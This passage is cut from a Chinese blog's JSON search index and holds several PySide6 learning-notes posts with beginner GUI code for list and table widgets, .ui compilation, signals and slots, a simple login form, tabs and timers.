<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">10</span>):<br>            self.listWidget.item(i).setCheckState(Qt.CheckState.Unchecked)<br><br>        self.listWidget.sortItems(Qt.SortOrder.AscendingOrder)<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.listWidget)<br>        self.setLayout(self.mainLayout)<br>        self.bind()<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">bind</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-comment\"># 信号——当前项改变——选中</span><br>        self.listWidget.currentItemChanged.connect(self.listChanged)<br>        <span class=\"hljs-comment\"># 信号——当前信号改变</span><br>        self.listWidget.itemChanged.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;当前项被选中了&#x27;</span>, self.listWidget.currentItem().checkState()))<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">listChanged</span>(<span class=\"hljs-params\">self, item, previous</span>):<br>        <span class=\"hljs-keyword\">try</span>:<br>            <span class=\"hljs-built_in\">print</span>(previous.text())    <span class=\"hljs-comment\"># 改变前的</span><br>        <span class=\"hljs-keyword\">except</span>:<br>            <span class=\"hljs-keyword\">pass</span><br>        <span class=\"hljs-built_in\">print</span>(item.text())        <span class=\"hljs-comment\"># 改变后的(现在的)</span><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br><br></code></pre></td></tr></table></figure>\n\n<p>运行之后是这个样子的</p>\n\n","categories":["PySide6"],"tags":["python"]},{"title":"PySide6学习笔记#19","url":"/2023/05/13/PySide6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-19/","content":"<p>今天是QTableWidget的学习</p>\n<span id=\"more\"></span>\n\n<p>这个控件就是那种远控里面经常看到的，</p>\n<p>因此比较关键因为这个很实用，</p>\n<p>无论是自动化办公还是远控啥的，</p>\n<p>这个控件必学</p>\n<h1 id=\"基本功能\"><a href=\"#基本功能\" class=\"headerlink\" title=\"基本功能\"></a>基本功能</h1><p>一些简单的表格操作，</p>\n<p>一般就是以下一个需求</p>\n<ul>\n<li>自定义行、列</li>\n<li>设置表头</li>\n<li>填充数据</li>\n<li>增删改查</li>\n<li>特殊信号处理</li>\n<li>细节处理（布局）</li>\n</ul>\n<h2 id=\"笔记\"><a href=\"#笔记\" class=\"headerlink\" title=\"笔记\"></a>笔记</h2>\n\n<p>and</p>\n\n\n<p>and</p>\n\n\n<p>到这里，</p>\n<p>这个控件的前5节课就结束辣</p>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QVBoxLayout, QTableWidget, QTableWidgetItem, QHeaderView<br><span class=\"hljs-keyword\">from</span> faker <span class=\"hljs-keyword\">import</span> Faker<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.resize(<span class=\"hljs-number\">1000</span>, <span class=\"hljs-number\">600</span>)<br>        self.fake = Faker(locale=<span class=\"hljs-string\">&#x27;zh_CN&#x27;</span>)<br>        self.content = [[self.fake.name(), self.fake.address(), self.fake.ascii_free_email()] <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">80</span>)]<br>        <span class=\"hljs-comment\"># 基本设置</span><br>        self.table = QTableWidget()<br>        self.table.setRowCount(<span class=\"hljs-built_in\">len</span>(self.content))<br>        self.table.setColumnCount(<span class=\"hljs-number\">3</span>)<br>        self.table.setHorizontalHeaderLabels([<span class=\"hljs-string\">&#x27;姓名&#x27;</span>, <span class=\"hljs-string\">&#x27;地址&#x27;</span>, <span class=\"hljs-string\">&#x27;邮箱&#x27;</span>])<br>        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)<br>        <span class=\"hljs-comment\"># 增</span><br>        <span class=\"hljs-keyword\">for</span> rowIndex, row <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">enumerate</span>(self.content):<br>            <span class=\"hljs-keyword\">for</span> columnIndex, column <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">enumerate</span>(row):<br>                self.table.setItem(rowIndex, columnIndex, QTableWidgetItem(column))<br><br>        <span class=\"hljs-comment\"># 改</span><br>        self.table.item(<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>).setText(<span class=\"hljs-string\">&#x27;test&#x27;</span>)<br>        <span class=\"hljs-comment\"># 查——排序</span><br>        self.table.setSortingEnabled(<span class=\"hljs-literal\">True</span>)<br>        <span class=\"hljs-comment\"># 删</span><br>        self.table.removeRow(<span class=\"hljs-number\">0</span>)<br>        <span class=\"hljs-comment\"># 信号</span><br>        self.table.cellClicked.connect(<span class=\"hljs-keyword\">lambda</span> x, y: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f&#x27;当前点击了第<span class=\"hljs-subst\">&#123;x+<span class=\"hljs-number\">1</span>&#125;</span>行 第<span class=\"hljs-subst\">&#123;y+<span class=\"hljs-number\">1</span>&#125;</span>列&#x27;</span>))<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.table)<br>        self.setLayout(self.mainLayout)<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"高阶功能\"><a href=\"#高阶功能\" class=\"headerlink\" title=\"高阶功能\"></a>高阶功能</h1><h2 id=\"搜索和跳转\"><a href=\"#搜索和跳转\" class=\"headerlink\" title=\"搜索和跳转\"></a>搜索和跳转</h2><p>这里我有一些和up不一样，</p>\n<p>我都在注释里面写了，</p>\n<p>例如他按下按下按钮才会搜索，</p>\n<p>我是内容一修改就触发信号，</p>\n<p>然后我这里有些地方会出现报错，</p>\n<p>我也用try except包起来了，</p>\n<p>不影响搜索数据的</p>\n<h3 id=\"笔记-1\"><a href=\"#笔记-1\" class=\"headerlink\" title=\"笔记\"></a>笔记</h3>\n\n<h3 id=\"代码-1\"><a href=\"#代码-1\" class=\"headerlink\" title=\"代码\"></a>代码</h3><p>前面的先删除了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> (QApplication, QWidget, QVBoxLayout,<br>                               QTableWidget, QTableWidgetItem, QHeaderView,<br>                               QLineEdit, QPushButton)<br><span class=\"hljs-keyword\">from</span> PySide6.QtCore <span class=\"hljs-keyword\">import</span> Qt<br><span class=\"hljs-keyword\">from</span> faker <span class=\"hljs-keyword\">import</span> Faker<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.resize(<span class=\"hljs-number\">1000</span>, <span class=\"hljs-number\">600</span>)<br>        self.fake = Faker(locale=<span class=\"hljs-string\">&#x27;zh_CN&#x27;</span>)<br>        self.content = [[self.fake.name(), self.fake.address(), self.fake.ascii_free_email()] <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">80</span>)]<br>        <span class=\"hljs-comment\"># 基本设置</span><br>        self.table = QTableWidget()<br>        self.table.setRowCount(<span class=\"hljs-built_in\">len</span>(self.content))<br>        self.table.setColumnCount(<span class=\"hljs-number\">3</span>)<br>        self.table.setHorizontalHeaderLabels([<span class=\"hljs-string\">&#x27;姓名&#x27;</span>, <span class=\"hljs-string\">&#x27;地址&#x27;</span>, <span class=\"hljs-string\">&#x27;邮箱&#x27;</span>])<br>        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)<br>        <span class=\"hljs-comment\"># 搜索栏 搜索框中的内容一变就触发 去除按钮</span><br>        self.line = QLineEdit()<br>        self.line.textChanged.connect(<span class=\"hljs-keyword\">lambda</span>: self.check())<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.line)<br>        self.mainLayout.addWidget(self.table)<br>        self.setLayout(self.mainLayout)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">search</span>(<span class=\"hljs-params\">self, text</span>):<br>        result = self.table.findItems(text, Qt.MatchFlag.MatchContains)<br>        <span class=\"hljs-keyword\">for</span> rowIndex, row <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">enumerate</span>(self.content):<br>            <span class=\"hljs-keyword\">for</span> columnIndex, column <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">enumerate</span>(row):<br>                <span class=\"hljs-keyword\">try</span>:   <span class=\"hljs-comment\"># 这里会出现几个None导致报错 我也不知道为啥</span><br>                    self.table.item(rowIndex, columnIndex).setBackground(Qt.GlobalColor.white)<br>                <span class=\"hljs-keyword\">except</span>:<br>                    <span class=\"hljs-keyword\">pass</span><br>        <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> result:<br>            i.setBackground(Qt.GlobalColor.red)<br>            <span class=\"hljs-built_in\">print</span>(i.text())<br>        <span class=\"hljs-keyword\">try</span>:<br>            self.table.scrollToItem(result[<span class=\"hljs-number\">0</span>], QTableWidget.ScrollHint.PositionAtTop)<br>        <span class=\"hljs-keyword\">except</span>:   <span class=\"hljs-comment\"># 没有搜索到内容会出现报错</span><br>            <span class=\"hljs-keyword\">pass</span><br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">check</span>(<span class=\"hljs-params\">self</span>):   <span class=\"hljs-comment\"># 检查输入框是否为空 不然清空的时候会全选</span><br>        <span class=\"hljs-keyword\">if</span> self.line.text() != <span class=\"hljs-string\">&#x27;&#x27;</span>:<br>            self.search(self.line.text())<br>        <span class=\"hljs-keyword\">else</span>:<br>            <span class=\"hljs-keyword\">pass</span><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"表格的合并\"><a href=\"#表格的合并\" class=\"headerlink\" title=\"表格的合并\"></a>表格的合并</h2><p>这个感觉没什么用处</p>\n<h3 id=\"笔记-2\"><a href=\"#笔记-2\" class=\"headerlink\" title=\"笔记\"></a>笔记</h3>\n\n<h3 id=\"代码-2\"><a href=\"#代码-2\" class=\"headerlink\" title=\"代码\"></a>代码</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> (QApplication, QWidget, QVBoxLayout,<br>                               QTableWidget, QTableWidgetItem, QHeaderView,<br>                               QLineEdit, QPushButton)<br><span class=\"hljs-keyword\">from</span> PySide6.QtCore <span class=\"hljs-keyword\">import</span> Qt<br><span class=\"hljs-keyword\">from</span> faker <span class=\"hljs-keyword\">import</span> Faker<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.resize(<span class=\"hljs-number\">1000</span>, <span class=\"hljs-number\">600</span>)<br>        self.fake = Faker(locale=<span class=\"hljs-string\">&#x27;zh_CN&#x27;</span>)<br>        self.content = [[self.fake.name(), self.fake.address(), self.fake.ascii_free_email()] <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">80</span>)]<br>        <span class=\"hljs-comment\"># 基本设置</span><br>        self.table = QTableWidget()<br>        self.table.setRowCount(<span class=\"hljs-built_in\">len</span>(self.content))<br>        self.table.setColumnCount(<span class=\"hljs-number\">3</span>)<br>        self.table.setHorizontalHeaderLabels([<span class=\"hljs-string\">&#x27;姓名&#x27;</span>, <span class=\"hljs-string\">&#x27;地址&#x27;</span>, <span class=\"hljs-string\">&#x27;邮箱&#x27;</span>])<br>        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)<br>        <span class=\"hljs-comment\"># 增</span><br>        <span class=\"hljs-keyword\">for</span> rowIndex, row <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">enumerate</span>(self.content):<br>            <span class=\"hljs-keyword\">for</span> columnIndex, column <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">enumerate</span>(row):<br>                self.table.setItem(rowIndex, columnIndex, QTableWidgetItem(column))<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.table)<br>        self.setLayout(self.mainLayout)<br>        <span class=\"hljs-comment\"># 合并</span><br>        <span class=\"hljs-comment\"># 参数:第几行, 第几列(就是哪一个单元格), 占的行数, 占的列数(高，宽)</span><br>        self.table.setSpan(<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">3</span>)<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"上下文菜单\"><a href=\"#上下文菜单\" class=\"headerlink\" title=\"上下文菜单\"></a>上下文菜单</h2><p>这个东西和其他的一样，</p>\n<p>都是千篇一律的，</p>\n<p>可以不看教程就敲出来</p>\n<h3 id=\"代码-3\"><a href=\"#代码-3\" class=\"headerlink\" title=\"代码\"></a>代码</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> (QApplication, QWidget, QVBoxLayout,<br>                               QTableWidget, QTableWidgetItem, QHeaderView)<br><span class=\"hljs-keyword\">from</span> PySide6.QtGui <span class=\"hljs-keyword\">import</span> QAction<br><span class=\"hljs-keyword\">from</span> PySide6.QtCore <span class=\"hljs-keyword\">import</span> Qt<br><span class=\"hljs-keyword\">from</span> faker <span class=\"hljs-keyword\">import</span> Faker<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.resize(<span class=\"hljs-number\">1000</span>, <span class=\"hljs-number\">600</span>)<br>        self.fake = Faker(locale=<span class=\"hljs-string\">&#x27;zh_CN&#x27;</span>)<br>        self.content = [[self.fake.name(), self.fake.address(), self.fake.ascii_free_email()] <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">80</span>)]<br>        <span class=\"hljs-comment\"># 基本设置</span><br>        self.table = QTableWidget()<br>        self.table.setRowCount(<span class=\"hljs-built_in\">len</span>(self.content))<br>        self.table.setColumnCount(<span class=\"hljs-number\">3</span>)<br>        self.table.setHorizontalHeaderLabels([<span class=\"hljs-string\">&#x27;姓名&#x27;</span>, <span class=\"hljs-string\">&#x27;地址&#x27;</span>, <span class=\"hljs-string\">&#x27;邮箱&#x27;</span>])<br>        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)<br>        <span class=\"hljs-comment\"># 增</span><br>        <span class=\"hljs-keyword\">for</span> rowIndex, row <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">enumerate</span>(self.content):<br>            <span class=\"hljs-keyword\">for</span> columnIndex, column <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">enumerate</span>(row):<br>                self.table.setItem(rowIndex, columnIndex, QTableWidgetItem(column))<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.table)<br>        self.setLayout(self.mainLayout)<br>        <span class=\"hljs-comment\"># 合并</span><br>        self.action1 = QAction(<span class=\"hljs-string\">&#x27;1&#x27;</span>)<br>        self.action2 = QAction(<span class=\"hljs-string\">&#x27;2&#x27;</span>)<br>        self.action3 = QAction(<span class=\"hljs-string\">&#x27;3&#x27;</span>)<br>        self.table.addActions([self.action1, self.action2, self.action3])<br>        self.table.setContextMenuPolicy(Qt.ContextMenuPolicy.ActionsContextMenu)<br>        self.action1.triggered.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-number\">1</span>))<br>        self.action2.triggered.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-number\">2</span>))<br>        self.action3.triggered.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-number\">3</span>))<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n","categories":["PySide6"],"tags":["python"]},{"title":"PySide6学习笔记#2","url":"/2023/04/23/PySide6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2/","content":"<p>今天学习绘制编译ui、信号与槽、并做一个简易的登录界面</p>\n<span id=\"more\"></span>\n\n<h1 id=\"手绘ui\"><a href=\"#手绘ui\" class=\"headerlink\" title=\"手绘ui\"></a>手绘ui</h1><p><a href=\"https://www.bilibili.com/video/BV1c84y1N7iL?p=6&vd_source=1c43bcf31e4abf33f3960dd414786c92\">https://www.bilibili.com/video/BV1c84y1N7iL?p=6&amp;vd_source=1c43bcf31e4abf33f3960dd414786c92</a></p>\n<h1 id=\"编译ui文件\"><a href=\"#编译ui文件\" class=\"headerlink\" title=\"编译ui文件\"></a>编译ui文件</h1><p>后面的p7就是讲如何将ui文件转换为py文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">pyside6-uic 登录框.ui -o LoginUi.py<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项\"></a>注意事项</h2><ol>\n<li><p>from xxx import的时候可以是Ui_Form也可以是其他的</p>\n</li>\n<li><p>如果ui是qwidget，那么import的也要是qwidget</p>\n</li>\n</ol>\n<h2 id=\"导入ui\"><a href=\"#导入ui\" class=\"headerlink\" title=\"导入ui\"></a>导入ui</h2><h3 id=\"法1\"><a href=\"#法1\" class=\"headerlink\" title=\"法1\"></a>法1</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget<br><span class=\"hljs-keyword\">from</span> LoginUi <span class=\"hljs-keyword\">import</span> Ui_Form   <span class=\"hljs-comment\"># 注意这里</span><br><br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):    <span class=\"hljs-comment\"># 注意这里不要和上面的不一样</span><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.ui = Ui_Form()<br>        self.ui.setupUi(self)<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n\n\n<p>这样就成功了</p>\n<h3 id=\"法2\"><a href=\"#法2\" class=\"headerlink\" title=\"法2\"></a>法2</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget<br><span class=\"hljs-keyword\">from</span> LoginUi <span class=\"hljs-keyword\">import</span> Ui_Form<br><br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(QWidget, Ui_Form):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.setupUi(self)<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"信号与槽\"><a href=\"#信号与槽\" class=\"headerlink\" title=\"信号与槽\"></a>信号与槽</h1><p>这个作者打了一个非常形象的比方，</p>\n<p>简单来说，就是pyside6 不再是一直循环检测，</p>\n<p>而是采用了动态检测的方式，</p>\n<p>这样不仅响应快，而且性能损耗小</p>\n\n\n<h1 id=\"实现简单登录页面\"><a href=\"#实现简单登录页面\" class=\"headerlink\" title=\"实现简单登录页面\"></a>实现简单登录页面</h1><p>ui应该是已经画好并且编译好的，</p>\n<p>这里我先上代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget<br><span class=\"hljs-keyword\">from</span> LoginUi <span class=\"hljs-keyword\">import</span> Ui_Form<br><span class=\"hljs-keyword\">import</span> win32api<br><br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(QWidget, Ui_Form):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.setupUi(self)<br>        self.pushButton.clicked.connect(self.func)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">func</span>(<span class=\"hljs-params\">self</span>):<br>        account = self.lineEdit.text()<br>        pwd = self.lineEdit_2.text()<br>        <span class=\"hljs-keyword\">if</span> account == <span class=\"hljs-string\">&#x27;Vincent&#x27;</span> <span class=\"hljs-keyword\">and</span> pwd == <span class=\"hljs-string\">&#x27;114514&#x27;</span>:<br>            win32api.MessageBox(<span class=\"hljs-number\">0</span>, <span class=\"hljs-string\">&#x27;成功&#x27;</span>, <span class=\"hljs-string\">&#x27;登录成功&#x27;</span>, <span class=\"hljs-number\">0</span>)<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>说一下我出现的问题：</p>\n<ol>\n<li><p>那个lineEdit，不小心写成了textEdit，然后报错textEdit没有.text这个东西</p>\n</li>\n<li><p>事件绑定那里，函数名不要加括号！相当于threading里面的target要执行的函数不加括号一样</p>\n</li>\n</ol>\n<h1 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h1><ol>\n<li><p>导入ui文件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">from xxx_Ui import Ui_Form<br><br> def __init__(self):<br>        super().__init__()<br>        self.setupUi(self)<br></code></pre></td></tr></table></figure></li>\n</ol>\n","categories":["PySide6"],"tags":["python"]},{"title":"PySide6学习笔记#20","url":"/2023/05/15/PySide6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-20/","content":"<p>今天的内容是QTabWidget选项卡，</p>\n<p>QTimer计时器</p>\n<span id=\"more\"></span>\n\n<p>前面一些QTableView的内容我就跳过了，</p>\n<p>因为就我目前的需求而言用不着这些，</p>\n<p>并且主要是他太难了，</p>\n<p>还讲了很多课时</p>\n<h1 id=\"QTabWidget\"><a href=\"#QTabWidget\" class=\"headerlink\" title=\"QTabWidget\"></a>QTabWidget</h1><h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QVBoxLayout, QTabWidget, QLabel, QPushButton<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br><br>        self.wid1 = QWidget()<br>        self.layout1 = QVBoxLayout()<br>        self.btn1 = QPushButton(<span class=\"hljs-string\">&#x27;1&#x27;</span>)<br>        self.lb1 = QLabel(<span class=\"hljs-string\">&#x27;1&#x27;</span>)<br>        self.layout1.addWidget(self.btn1)<br>        self.layout1.addWidget(self.lb1)<br>        self.wid1.setLayout(self.layout1)<br><br>        self.wid2 = QWidget()<br>        self.layout2 = QVBoxLayout()<br>        self.btn2 = QPushButton(<span class=\"hljs-string\">&#x27;2&#x27;</span>)<br>        self.lb2 = QLabel(<span class=\"hljs-string\">&#x27;2&#x27;</span>)<br>        self.layout2.addWidget(self.btn2)<br>        self.layout2.addWidget(self.lb2)<br>        self.wid2.setLayout(self.layout2)<br><br>        self.tab = QTabWidget()<br>        self.tab.addTab(self.wid1, <span class=\"hljs-string\">&#x27;选项卡1&#x27;</span>)<br>        self.tab.addTab(self.wid2, <span class=\"hljs-string\">&#x27;选项卡2&#x27;</span>)<br>        self.tab.setTabsClosable(<span class=\"hljs-literal\">True</span>)    <span class=\"hljs-comment\"># 可关闭的</span><br>        self.tab.setMovable(<span class=\"hljs-literal\">True</span>)    <span class=\"hljs-comment\"># 可移动的</span><br>        self.tab.setTabShape(QTabWidget.TabShape.Rounded)   <span class=\"hljs-comment\"># 设置形状</span><br>        self.tab.tabCloseRequested.connect(<span class=\"hljs-keyword\">lambda</span> x: self.tab.removeTab(x))    <span class=\"hljs-comment\"># 关闭被点击--&gt;删除</span><br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.tab)<br>        self.setLayout(self.mainLayout)<br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"QTimer\"><a href=\"#QTimer\" class=\"headerlink\" title=\"QTimer\"></a>QTimer</h1><h2 id=\"代码-1\"><a href=\"#代码-1\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QVBoxLayout, QLabel<br><span class=\"hljs-keyword\">from</span> PySide6.QtGui <span class=\"hljs-keyword\">import</span> QPixmap<br><span class=\"hljs-keyword\">from</span> PySide6.QtCore <span class=\"hljs-keyword\">import</span> QTimer<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br><br>        self.index = <span class=\"hljs-number\">0</span><br>        self.picPath = <span class=\"hljs-string\">&#x27;D:\\\\Pictures\\\\Camera Roll\\\\CR\\\\&#x27;</span><br><br>        self.lb = QLabel()<br>        self.timer = QTimer()<br>        self.timer.timeout.connect(self.changePic)<br>        self.timer.start(<span class=\"hljs-number\">1000</span>)  <span class=\"hljs-comment\"># 单位是毫秒</span><br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addWidget(self.lb)<br>        self.setLayout(self.mainLayout)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">changePic</span>(<span 